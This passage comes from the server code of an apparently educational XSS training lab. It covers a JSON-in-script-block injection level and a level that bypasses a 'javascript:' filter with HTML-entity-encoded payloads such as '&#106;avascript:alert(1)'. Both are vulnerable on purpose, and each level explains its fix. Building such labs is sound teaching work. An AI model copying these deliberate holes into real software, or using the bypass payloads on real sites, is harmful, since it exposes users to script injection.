      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: JSON Injection in Script Blocks</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">Many web applications embed server-side data into pages using inline <code>&lt;script&gt;</code> blocks with JSON: <code>var config = {"name": "USER_INPUT"};</code>. Developers often focus on preventing HTML tag injection (encoding <code>&lt;</code> and <code>&gt;</code>) but forget that the attacker is <strong>already inside a JavaScript execution context</strong>. If the attacker can inject an unescaped <code>"</code>, they break out of the JSON string and can inject arbitrary JavaScript — all within the same trusted script block. This bypasses CSP because the injected code runs inside an already-allowed <code>&lt;script&gt;</code> tag. The fix: JSON.stringify() with proper escaping of <code>"</code>, <code>\\</code>, and line terminators, or better yet, use <code>data-*</code> attributes instead of inline JSON.</p>
    </div>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" id="jsonOutput"><p style="color:#484f58;">Submit a name for the config.</p></div>
    <script>
      var appConfig = {"name": "${escaped}", "role": "user", "theme": "dark"};
      document.getElementById('jsonOutput').innerHTML =
        '<p>Config loaded: ' + appConfig.name + ' (' + appConfig.role + ')</p>';
    </script>`
  );
  res.set('Content-Security-Policy', `script-src 'nonce-${nonce}' 'self'`);
  res.send(html.replace(/<script>/g, `<script nonce="${nonce}">`).replace(/<script src=/g, `<script nonce="${nonce}" src=`));
});

// ============================================================
// LEVEL 23 - URL Scheme Bypass via Entity Encoding
// ============================================================
app.get('/level/23', (req, res) => {
  logRawRequest(23, req);
  const url = req.query.url || '';
  let filtered = url.replace(/<\/?script\b[^>]*>/gi, '');
  logFilterLogic(23, 'Strip <script>', url, filtered);
  const u1 = filtered;
  filtered = filtered.replace(/\bon\w+\s*=/gi, '');
  logFilterLogic(23, 'Strip on* handlers', u1, filtered);
  const jsBlocked = /javascript\s*:/i.test(filtered);
  logToTerminal(23, jsBlocked ? 'warn' : 'success', { step: 'Literal javascript: scan on server string', hrefCandidate: filtered, blocked: jsBlocked });

  if (jsBlocked) {
    res.send(levelPage(
      'URL Scheme Bypass', 23, 'Expert',
      '<code>&lt;script&gt;</code> stripped, event handlers stripped, <code>javascript:</code> blocked (case-insensitive). Input is placed into an <code>&lt;a href&gt;</code>.',
      'The filter checks for <code>javascript:</code> as a literal string in the raw input. But HTML attribute values are <strong>entity-decoded by the browser</strong> before the URL scheme is interpreted. Encode any character of "javascript:" using HTML entities: <code>&amp;#106;avascript:alert(1)</code> or <code>&amp;#x6A;avascript:alert(1)</code>. The server sees <code>&amp;#106;avascript:</code> (no literal "javascript:"), but the browser decodes it to <code>javascript:</code> and executes it when clicked.',
      `<p style="color:#8b949e;margin-bottom:1rem;">Provide a URL. The server blocks script tags, event handlers, and <code>javascript:</code>. Your URL is placed into a clickable link.</p>
      <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
        <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: URL Scheme Bypass via Entity Encoding</p>
        <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">When user input is placed into an HTML attribute like <code>href="..."</code>, the browser performs <strong>HTML entity decoding</strong> on the attribute value before interpreting it as a URL. This means <code>&amp;#106;</code> (the HTML entity for "j") becomes "j" in the browser's URL parser. A server-side filter that checks the raw string for <code>javascript:</code> won't find a match if the attacker uses <code>&amp;#106;avascript:</code> or <code>&amp;#x6A;avascript:</code>. The browser, however, decodes the entity and sees <code>javascript:</code> — executing the code when the link is clicked. This is a fundamental mismatch between server-side string matching and browser-side HTML parsing. Defense: decode all entities server-side before checking, or parse the URL properly and allowlist only <code>http:</code> and <code>https:</code> schemes.</p>
      </div>
      <form method="GET">
        <input type="text" name="url" placeholder="URL..." value="">
        <button type="submit">Submit</button>
      </form>
      <div class="output"><p style="color:#f85149;">Blocked: javascript: protocol detected.</p></div>`
    ));
    return;
  }

  const hasUrl = url.length > 0;
  logToTerminal(23, 'info', { note: 'Server emitted href with filtered string; browser will HTML-decode attribute before navigating.', emittedHref: filtered });
  res.send(levelPage(
    'URL Scheme Bypass', 23, 'Expert',
    '<code>&lt;script&gt;</code> stripped, event handlers stripped, <code>javascript:</code> blocked (case-insensitive). Input is placed into an <code>&lt;a href&gt;</code>.',
    'The filter checks for <code>javascript:</code> as a literal string in the raw input. But HTML attribute values are <strong>entity-decoded by the browser</strong> before the URL scheme is interpreted. Encode any character of "javascript:" using HTML entities: <code>&amp;#106;avascript:alert(1)</code> or <code>&amp;#x6A;avascript:alert(1)</code>. The server sees <code>&amp;#106;avascript:</code> (no literal "javascript:"), but the browser decodes it to <code>javascript:</code> and executes it when clicked.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Provide a URL. The server blocks script tags, event handlers, and <code>javascript:</code>. Your URL is placed into a clickable link.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: URL Scheme Bypass via Entity Encoding</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">When user input is placed into an HTML attribute like <code>href="..."</code>, the browser performs <strong>HTML entity decoding</strong> on the attribute value before interpreting it as a URL. This means <code>&amp;#106;</code> (the HTML entity for "j") becomes "j" in the browser's URL parser. A server-side filter that checks the raw string for <code>javascript:</code> won't find a match if the attacker uses <code>&amp;#106;avascript:</code> or <code>&amp;#x6A;avascript:</code>. The browser, however, decodes the entity and sees <code>javascript:</code> — executing the code when the link is clicked. This is a fundamental mismatch between server-side string matching and browser-side HTML parsing. Defense: decode all entities server-side before checking, or parse the URL properly and allowlist only <code>http:</code> and <code>https:</code> schemes.</p>
    </div>
    <form method="GET">
      <input type="text" name="url" placeholder="URL..." value="">
      <button type="submit">Submit</button>
    </form>
    ${hasUrl ? `<div class="output"><p>Click the link:</p><a href="${filtered}" style="color:#58a6ff;font-size:1.1rem;font-weight:600;">Visit Link &rarr;</a></div>` : '<div class="output"><p style="color:#484f58;">Enter a URL to create a link.</p></div>'}`
  ));
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
  console.log(`\n  XSS Training Lab running at http://localhost:${PORT}\n`);
  console.log(`  Levels 1-23 available. Start at Level 1 and work your way up.\n`);
});
